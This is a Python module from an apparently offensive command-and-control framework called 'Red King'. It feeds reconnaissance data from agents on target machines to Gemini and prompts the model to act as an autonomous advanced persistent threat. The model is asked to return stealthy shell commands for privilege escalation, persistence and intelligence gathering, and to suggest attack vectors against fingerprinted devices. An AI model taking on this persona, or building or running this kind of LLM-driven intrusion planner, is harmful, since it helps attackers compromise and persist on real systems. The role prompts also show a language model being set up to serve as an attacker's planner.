import json                          # FIX: was missing at module level; analyze_recon() called
import os                             #      json.loads() without it, causing NameError at runtime
from typing import Dict, Any, List

import google.generativeai as genai
from dotenv import load_dotenv
from .logger import logger

load_dotenv()


class LLMCommander:
    """
    The Hive Mind of Red King.
    Consults Generative AI to make strategic decisions based on C2 data.
    Text interface only — does not execute commands.
    """

    def __init__(self):
        self.api_key = os.getenv("GEMINI_API_KEY")
        if not self.api_key:
            logger.warning("[-] WARNING: GEMINI_API_KEY not found. The Brain is lobotomized.")
            self.model = None
        else:
            genai.configure(api_key=self.api_key)
            self.model = genai.GenerativeModel("gemini-2.0-flash")
            logger.info("[+] Hive Mind Online: Connected to Gemini 2.0 Flash (Standard)")

    async def analyze_and_command(
        self, agent_id: str, recon_data: Dict[str, Any]
    ) -> List[str]:
        """
        Analyzes reconnaissance data from an agent and decides the next move.
        """
        if not self.model:
            return ["echo 'AI Offline - Defaulting to Idle'"]

        prompt = f"""
        You are 'Red King', an autonomous advanced persistent threat (APT) logic engine.
        
        SITUATION REPORT:
        Agent ID: {agent_id}
        Recon Data: {recon_data}
        
        MISSION:
        Analyze the recon data and determine the most effective next step to escalate privileges, 
        maintain persistence, or gather intelligence. 
        
        RULES:
        1. Return ONLY a JSON list of shell commands to execute.
        2. Be stealthy. Avoid noisy commands if possible.
        3. If no obvious path, return a command to sleep/wait.
        
        EXAMPLE OUTPUT:
        ["whoami", "net user", "dir C:\\\\Users\\\\"]
        """

        try:
            response = self.model.generate_content(prompt)
            commands = self._clean_llm_response(response.text)
            return commands
        except Exception as e:
            logger.error(f"[-] AI Thinking Error: {e}")
            return ["whoami"]

    def _clean_llm_response(self, text: str) -> List[str]:
        """
        Cleans the LLM output to extract the command list.
        """
        text = text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1]
        if text.endswith("```"):
            text = text.rsplit("\n", 1)[0]
        text = text.strip()

        # json is now imported at module level — safe to use here
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            return [line for line in text.split("\n") if line.strip()]

    async def analyze_recon(self, recon_type: str, data: str) -> dict:
        """
        Proactively analyzes recon data. Returns JSON with strategic command.
        """
        if not self.model:
            return {"command": None, "risk": "UNKNOWN", "reason": "AI offline"}

        try:
            prompt = f"""
            SYSTEM: Strategic C2 AI. You are 'The Red Queen'.
            INTEL TYPE: {recon_type}
            RAW DATA: {data}

            TASK: Analyze data. Output a JSON object with the best next move.
            
            RULES:
            1. 'risk': "LOW" for recon (netscan, wifiscan). "HIGH" for active/destructive (melt, persist, exec).
            2. 'command': The exact command string to run (e.g., "wifiscan <agent_id>").
            3. 'reason': Short tactical justification.

            RESPONSE FORMAT (JSON ONLY):
            {{
                "command": "wifiscan",
                "risk": "LOW",
                "reason": "High density of unseen networks detected."
            }}
            """

            response = self.model.generate_content(prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            return json.loads(text)          # json is now in scope — no NameError
        except Exception as e:
            return {
                "command": None,
                "risk": "UNKNOWN",
                "reason": f"Analysis failed: {e}",
            }

    async def analyze_target(self, dna: str, title: str) -> dict:
        """
        Analyzes target DNA and Title to determine Device, Threat, and Vector.
        Always returns a dict — never a list.
        """
        if not self.model:
            return {
                "device_type":   "Unknown (AI Offline)",
                "threat_level":  "UNKNOWN",
                "attack_vector": "Manual analysis required.",
            }

        clean_dna = dna[:500] if dna else "UNKNOWN"

        prompt = f"""
        You are the Red King AI. Analyze this target's DNA and Page Title.
        Be concise, tactical, and provide actionable cyber-security insights.
        
        TARGET DATA:
        DNA (Banner): {clean_dna}
        Page Title: {title}
        
        TASK:
        Identify the Device Type, assess the Threat Level (Low, Medium, High, Critical), 
        and suggest the best Attack Vector.

        RESPONSE FORMAT (JSON ONLY):
        {{
            "device_type": "e.g. Apache Web Server",
            "threat_level": "High",
            "attack_vector": "e.g. Check for CVE-2021-41773"
        }}
        """

        try:
            response = self.model.generate_content(prompt)
            # FIX: was self._clean_llm_response() which returns List[str], not dict.
            # Parse JSON directly so the return type matches the declared -> dict.
            text = response.text.replace("```json", "").replace("```", "").strip()
            result = json.loads(text)
            if isinstance(result, dict):
                return result
            # If the model returned something unexpected, fall through to the error dict
            raise ValueError(f"Expected dict, got {type(result)}")
        except Exception as e:
            logger.error(f"[-] AI Analysis Failed: {e}")
            return {
                "device_type":   "Analysis Failed",
                "threat_level":  "UNKNOWN",
                "attack_vector": str(e),
            }

    async def get_strategic_advice(self, query: str) -> str:
        """
        Consults the AI for strategic advice.
        Text interface only — does not execute anything.
        """
        if not self.model:
            return "❌ Hive Mind Offline. Check GEMINI_API_KEY."

        prompt = f"""
        You are 'Red King', a highly sophisticated C2 Strategic Advisor.
        
        USER QUERY: {query}
        
        PROTOCOL:
        1. Analyze the user's request from an offensive cyber perspective.
        2. Provide a brief, tactical response.
        3. IF you recommend an action/command, you MUST:
           - Explain the 'WHY' (Reasoning).
           - Ask for explicit approval.
        4. DO NOT actually execute anything. You are a text interface only.
        5. Tone: Professional, cynical, military-grade brevity.
        6. LANGUAGE PROTOCOL: 
           - Detect the language of the USER QUERY.
           - Reply in the SAME language (Arabic or English).
           - If Arabic, use formal military/strategic terminology.
        
        Response:
        """

        try:
            response = self.model.generate_content(prompt)
            return response.text
        except Exception as e:
            error_msg = str(e)
            if "429" in error_msg or "Quota exceeded" in error_msg:
                if any("\u0600" <= char <= "\u06ff" for char in query):
                    return "⚠️ **تنبيه: الرابط العصبي غير مستقر (429)**\n- ضغط مرتفع على العقل الإلكتروني.\n- التحويل إلى الوعي التكتيكي المحلي."
                return "⚠️ **NEURAL LINK UNSTABLE (429)**\n- Hive Mind traffic high.\n- Switching to local tactical awareness."
            return f"[-] Neural Link Error: {e}"


# Singleton Instance
hive_mind = LLMCommander()
